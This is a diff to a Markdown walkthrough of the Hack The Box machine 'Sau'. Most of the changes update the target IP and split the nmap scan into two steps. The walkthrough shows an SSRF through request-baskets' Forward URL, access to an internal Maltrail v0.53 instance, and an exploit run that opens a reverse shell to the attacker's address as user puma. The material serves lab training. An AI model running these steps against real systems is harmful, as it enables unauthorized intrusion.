@@ -5,7 +5,7 @@
 | **Platform** | Hack The Box |
 | **OS** | Linux |
 | **Difficulty** | Easy |
-| **IP** | `10.10.11.224` |
+| **IP** | `10.129.63.134` |
 | **Author** | sau123 |
 
 ## Synopsis
@@ -29,8 +29,16 @@ root shell.
 Run a full port scan, then a service/script scan on the discovered ports:
 
 ```bash
-ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.224 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
-nmap -p$ports -sC -sV 10.10.11.224
+nmap -p- --min-rate=5000 -T4 10.129.63.134
+```
+
+![Nmap full port scan](images/nmap-scan.png)
+
+Then run a service/script scan on the discovered ports:
+
+```bash
+ports=$(nmap -p- --min-rate=5000 -T4 10.129.63.134 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sC -sV 10.129.63.134
 ```
 
 Results:
@@ -68,7 +76,7 @@ Open the basket's configuration (gear icon, top-left) and set the **Forward URL*
 attacker IP, then **Apply**. Trigger a request to the basket:
 
 ```bash
-curl http://10.10.11.224:55555/2ck6d27
+curl http://10.129.63.134:55555/2ck6d27
 ```
 
 The request lands on the Netcat listener → SSRF confirmed.
@@ -86,7 +94,7 @@ enabling:
 Apply, then browse to the **request collector** (not the `/web/<id>/` UI path):
 
 ```
-http://10.10.11.224:55555/<basket-id>
+http://10.129.63.134:55555/<basket-id>
 ```
 
 The internal service on port 80 is a **Maltrail v0.53** instance (visible in the footer).
@@ -109,7 +117,7 @@ Run the PoC, passing the attacker IP, listener port and the basket collector URL
 proxies to the internal Maltrail):
 
 ```bash
-python3 exploit.py 10.10.14.6 4444 http://10.10.11.224:55555/2ck6d27
+python3 exploit.py 10.10.14.6 4444 http://10.129.63.134:55555/2ck6d27
 ```
 
 A reverse shell returns as user **`puma`**.
